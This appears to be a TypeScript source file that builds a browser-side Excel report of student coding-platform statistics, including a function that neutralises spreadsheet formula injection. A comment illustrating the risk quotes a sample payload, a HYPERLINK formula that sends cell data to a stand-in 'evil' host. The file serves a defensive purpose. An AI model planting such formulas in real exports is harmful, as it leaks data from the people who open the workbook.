import * as XLSX from "xlsx";

/**
 * Builds the report workbook IN THE BROWSER.
 *
 * Deliberately client-side: a college-wide export is tens of thousands of rows,
 * and assembling the .xlsx inside a Vercel function would put a large
 * serialise-and-stream job under the same 60s ceiling that already caused two
 * production bugs in this project. The browser has no such limit, and the data
 * is already there because the page fetched it.
 *
 * A note on "Power BI style": SheetJS writes cells, widths and formulas — not
 * chart objects. So this does not embed charts. Instead the **Fact** sheet is a
 * flat, fully denormalised grain (one row per student × platform), which is
 * exactly what a PivotTable or a Power BI import wants. Charts get built once,
 * on top of it, by whoever opens the file.
 */

type Row = Record<string, string | number | null>;

export type ReportData = {
  scope: {
    colleges: { id: string; name: string }[];
    classrooms: { id: string; name: string; college_id: string | null }[];
    platforms: { id: string; name: string; rank_metric: string }[];
    days: number;
    generatedAt: string;
  };
  totals: {
    students: number;
    classrooms: number;
    colleges: number;
    avgScore: number;
    totalSolved: number;
  };
  summaryPlatforms: {
    platform_name: string;
    rank_metric: string;
    students: number;
    coverage_pct: number;
    avg_metric: number | null;
    total_solved: number;
    top_student: string | null;
    top_value: number | null;
  }[];
  roster: Row[];
  fact: Row[];
  daily: Row[];
};

/** Column widths from content, so nothing lands as `####`. */
function autoWidth(rows: Row[]): XLSX.ColInfo[] {
  if (rows.length === 0) return [];
  const keys = Object.keys(rows[0]);
  return keys.map((k) => {
    const longest = rows.reduce((max, r) => {
      const len = String(r[k] ?? "").length;
      return len > max ? len : max;
    }, k.length);
    return { wch: Math.min(Math.max(longest + 2, 8), 42) };
  });
}

/**
 * Neutralise spreadsheet formula injection (CSV injection).
 *
 * Student names, rolls and handles are scraped or bulk-imported, so their first
 * character is not under our control. Excel, LibreOffice and Sheets all treat a
 * leading =, +, -, @ (and the tab/CR forms) as the start of a formula, so a
 * student named `=HYPERLINK("http://evil/?"&A1,"click")` becomes live content in
 * the exported workbook — executed on the machine of whichever staff member
 * opens the report.
 *
 * Prefixing with an apostrophe is the standard mitigation: the cell renders as
 * the literal text and the leading quote is not part of the value.
 */
function deFormula(value: unknown): unknown {
  if (typeof value !== "string" || value.length === 0) return value;
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

function sheetFrom(rows: Row[]): XLSX.WorkSheet {
  const safeRows = rows.map((r) => {
    const out: Row = {};
    for (const [k, v] of Object.entries(r)) out[k] = deFormula(v) as Row[string];
    return out;
  });
  const ws = XLSX.utils.json_to_sheet(safeRows);
  ws["!cols"] = autoWidth(rows);
  if (rows.length > 0) {
    // Freeze the header so a 40k-row Fact sheet stays navigable.
    ws["!freeze"] = { xSplit: "0", ySplit: "1" };
    ws["!autofilter"] = {
      ref: XLSX.utils.encode_range({
        s: { r: 0, c: 0 },
        e: { r: rows.length, c: Object.keys(rows[0]).length - 1 },
      }),
    };
  }
  return ws;
}

export function buildReportWorkbook(data: ReportData): XLSX.WorkBook {
  const wb = XLSX.utils.book_new();

  // ── Summary ───────────────────────────────────────────────────────────────
  const summary: Row[] = [
    { Field: "Generated", Value: new Date(data.scope.generatedAt).toLocaleString() },
    { Field: "Colleges", Value: data.scope.colleges.map((c) => c.name).join(", ") || "—" },
    { Field: "Classrooms", Value: data.scope.classrooms.map((c) => c.name).join(", ") || "—" },
    { Field: "Students", Value: data.totals.students },
    { Field: "Avg Almanac Score", Value: data.totals.avgScore },
    // Named a raw sum on purpose: adding LeetCode easies to Codeforces hards is
    // apples-to-oranges, which is why the Almanac Score exists alongside it.
    { Field: "Problems Solved (raw sum)", Value: data.totals.totalSolved },
    { Field: "Daily history window (days)", Value: data.scope.days },
    { Field: "", Value: "" },
    { Field: "PER PLATFORM", Value: "" },
  ];
  for (const p of data.summaryPlatforms) {
    summary.push({
      Field: p.platform_name,
      Value:
        `${p.students} students (${p.coverage_pct}%) · avg ${p.avg_metric ?? "—"} ${p.rank_metric}` +
        ` · ${p.total_solved.toLocaleString()} solved` +
        (p.top_student ? ` · top: ${p.top_student} (${p.top_value})` : ""),
    });
  }
  XLSX.utils.book_append_sheet(wb, sheetFrom(summary), "Summary");

  // ── The three data sheets ────────────────────────────────────────────────
  if (data.roster.length) XLSX.utils.book_append_sheet(wb, sheetFrom(data.roster), "Roster");
  if (data.fact.length) XLSX.utils.book_append_sheet(wb, sheetFrom(data.fact), "Fact");
  if (data.daily.length) XLSX.utils.book_append_sheet(wb, sheetFrom(data.daily), "Daily");

  return wb;
}

/** Build and download. Returns the filename so the caller can report it. */
export function downloadReportWorkbook(data: ReportData): string {
  const wb = buildReportWorkbook(data);
  const scope =
    data.scope.classrooms.length === 1
      ? data.scope.classrooms[0].name
      : data.scope.colleges.length === 1
        ? data.scope.colleges[0].name
        : `${data.scope.classrooms.length}-cohorts`;

  const safe = scope
    .replace(/[^\w-]+/g, "-")
    .replace(/-+/g, "-")
    .slice(0, 40);
  const filename = `almanac-${safe}-${new Date().toISOString().slice(0, 10)}.xlsx`;
  XLSX.writeFile(wb, filename);
  return filename;
}

/** Internals exposed for tests only. */
export const __test = { deFormula };
